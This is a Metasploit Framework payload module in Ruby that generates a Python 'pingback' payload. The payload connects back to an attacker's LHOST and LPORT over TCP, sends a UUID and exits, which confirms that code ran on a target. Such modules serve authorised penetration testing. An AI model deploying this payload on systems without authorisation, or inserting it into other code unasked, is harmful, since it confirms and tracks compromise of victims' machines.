require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/python'

require 'msf/base/sessions/pingback'
require 'msf/base/sessions/pingback_options'
require 'msf/core/payload/pingback'

module MetasploitModule

  CachedSize = 185

  include Msf::Payload::Single
  include Msf::Sessions::PingbackOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name' => 'Python Pingback, Reverse TCP (via python)',
      'Description' => 'Connects back to the attacker, sends a UUID, then terminates',
      'Author' => 'asoto-r7',
      'License' => MSF_LICENSE,
      'Platform' => 'python',
      'Arch' => ARCH_PYTHON,
      'Handler' => Msf::Handler::ReverseTcp,
      'Session' => Msf::Sessions::Pingback,
      'PayloadType' => 'python',
      'Payload' =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  def generate
    super + command_string
  end

  def command_string
    pingback_uuid ||= generate_pingback_uuid
    pingback_uuid.gsub!('-','')

    cmd  = "import socket as s\n"
    cmd << "so=s.socket(s.AF_INET,s.SOCK_STREAM)\n"
    cmd << "try:\n"
    cmd << " so.connect(('#{ datastore['LHOST'] }',#{ datastore['LPORT'] }))\n"
    cmd << " so.send('#{pingback_uuid}'.decode('hex'))\n"
    cmd << " so.close()\n"
    cmd << "except:\n"
    cmd << " pass\n"

   cmd
 end

  def include_send_pingback
    true
  end
end


